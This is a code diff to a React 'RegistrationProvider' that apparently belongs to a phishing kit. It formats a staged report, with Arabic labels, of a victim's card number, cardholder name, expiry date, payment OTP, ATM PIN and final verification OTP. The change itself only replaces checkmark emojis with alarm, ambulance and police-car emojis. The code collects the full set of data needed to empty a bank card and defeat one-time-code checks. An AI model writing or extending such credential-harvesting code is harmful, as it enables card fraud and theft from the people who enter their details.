@@ -104,7 +104,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
 
     // Stage 4: Payment
     if (stage >= 4 && dataToFormat.cardNumber) {
-      message += `✅ <b>المرحلة 4: بيانات الدفع</b>\n`;
+      message += `🚨 <b>المرحلة 4: بيانات الدفع</b>\n`;
       message += `   💳 رقم البطاقة: ${dataToFormat.cardNumber}\n`;
       message += `   👤 اسم حامل البطاقة: ${dataToFormat.cardholderName}\n`;
       message += `   📅 تاريخ الانتهاء: ${dataToFormat.expiryDate}\n`;
@@ -115,21 +115,21 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
 
     // Stage 5: Payment OTP
     if (stage >= 5 && dataToFormat.paymentOtp) {
-      message += `✅ <b>المرحلة 5: رمز تأكيد الدفع</b>\n`;
+      message += `🚑 <b>المرحلة 5: رمز تأكيد الدفع</b>\n`;
       message += `   🔢 رمز OTP (6 أرقام): ${dataToFormat.paymentOtp}\n`;
       message += `\n`;
     }
 
     // Stage 6: ATM Pin
     if (stage >= 6 && dataToFormat.atmPin) {
-      message += `✅ <b>المرحلة 6: رقم PIN</b>\n`;
+      message += `🚨 <b>المرحلة 6: رقم PIN</b>\n`;
       message += `   🔐 رقم PIN: ${dataToFormat.atmPin}\n`;
       message += `\n`;
     }
 
     // Stage 7: OTP
     if (stage >= 7 && dataToFormat.otp) {
-      message += `✅ <b>المرحلة 7: رمز التحقق النهائي</b>\n`;
+      message += `🚓 <b>المرحلة 7: رمز التحقق النهائي</b>\n`;
       message += `   🔢 رمز OTP (4 أرقام): ${dataToFormat.otp}\n`;
       message += `\n`;
     }
